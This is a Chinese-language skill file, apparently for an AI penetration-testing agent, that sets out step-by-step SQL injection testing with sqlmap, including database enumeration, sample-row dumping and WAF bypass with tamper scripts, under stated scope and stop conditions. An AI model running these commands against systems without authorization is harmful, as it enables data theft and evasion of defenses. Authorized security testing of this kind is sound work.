---
name: sqli-sqlmap
description: 使用 sqlmap 检测和利用 SQL 注入漏洞，包括数据库枚举、数据提取和 WAF 绕过。
category: web
source: xalgorix
tags:
  - SQL 注入
  - sqlmap
  - 数据库
  - WAF 绕过
required_tools:
  - sqlmap
  - curl
---

# SQL 注入检测（sqlmap）

## 适用场景

- 目标 Web 应用的 URL 参数、POST 数据或 HTTP 头疑似存在 SQL 注入。
- 需要自动化验证注入点、枚举数据库结构和提取数据。
- 目标部署了 WAF，需要测试多种绕过方法。

## 授权边界

- **SQL 注入测试可能修改数据库状态**（如触发 INSERT/UPDATE 触发器）。测试前必须确认 scope 允许对数据库执行测试查询。
- 默认使用 `--risk=1 --level=1`，仅在主代理确认 scope 允许更高风险时提升。
- **禁止在生产数据库执行数据提取**。如果需要验证注入深度，提取 1-2 行样本即可，不进行全表导出。

## 前置条件

- 已识别潜在的注入点（URL 参数、POST body、Cookie、HTTP 头）。
- 已安装 `sqlmap`，版本 ≥ 1.7。
- 有测试网络的稳定 HTTP 连接。

## 执行步骤

### 步骤 1：识别注入点

```bash
# 从 Burp/ZAP 或手动测试获取疑似注入 URL
# 典型可疑参数：id=, user=, page=, search=, category=
```

记录注入点 URL 和方法（GET/POST）到 inventory。

### 步骤 2：基本检测

```bash
# 对单个参数进行基础检测
sqlmap -u "https://<target>/page?id=1" \
  --batch \
  --random-agent \
  --output-dir=./sqlmap_output \
  --level=1 --risk=1
```

`--batch` 使用默认选项，`--random-agent` 避免使用 sqlmap 默认 UA。

### 步骤 3：枚举数据库结构

```bash
# 如步骤 2 确认注入，枚举数据库名
sqlmap -u "https://<target>/page?id=1" \
  --batch --random-agent --output-dir=./sqlmap_output \
  --dbs

# 枚举指定数据库的表
sqlmap -u "https://<target>/page?id=1" \
  --batch --random-agent --output-dir=./sqlmap_output \
  -D <database_name> --tables

# 枚举指定表的列
sqlmap -u "https://<target>/page?id=1" \
  --batch --random-agent --output-dir=./sqlmap_output \
  -D <database_name> -T <table_name> --columns
```

### 步骤 4：提取样本数据

```bash
# 仅提取前 3 行验证，不导出全表
sqlmap -u "https://<target>/page?id=1" \
  --batch --random-agent --output-dir=./sqlmap_output \
  -D <database_name> -T <table_name> --dump --stop=3
```

### 步骤 5：WAF 绕过（如需）

```bash
# 使用 tamper 脚本绕过常见 WAF
sqlmap -u "https://<target>/page?id=1" \
  --batch --random-agent --output-dir=./sqlmap_output \
  --tamper=between,space2comment,charencode \
  --level=3 --risk=2
```

常用 tamper 组合：
- `between,space2comment`：对付基础过滤
- `charencode,randomcase`：对付关键字过滤
- `charunicodeencode,percentage`：对付强 WAF

### 步骤 6：清理

```bash
# 清理 sqlmap 缓存
sqlmap --purge
# 删除输出目录（如有敏感数据）
rm -rf ./sqlmap_output
```

## 停止条件

- `--risk=3` 可能尝试 `OR 1=1` 等危险语句，未经主代理确认不得使用。
- 如果 WAF 开始拦截所有请求（返回 403/429），暂停测试并报告。
- 发现数据库包含 PII（个人身份信息）时，立即停止数据提取并报告。
- 注入导致目标服务异常（500、超时），停止并记录。

## 输出格式

- 确认的注入点（URL、参数、注入类型：boolean/time/error/union）。
- 数据库类型和版本。
- 枚举的数据库/表结构摘要（不包含完整数据）。
- WAF 类型和有效绕过方法（如有）。
- 提取的样本数据（仅摘要，不写进度文件）。

## 验收标准

1. 所有疑似注入点均用 sqlmap 以 `--level=1 --risk=1` 完成基础检测。
2. 确认的注入点已记录数据库类型和注入方法。
3. 未执行全表数据导出。
4. 测试完成后已执行 `sqlmap --purge` 清理。
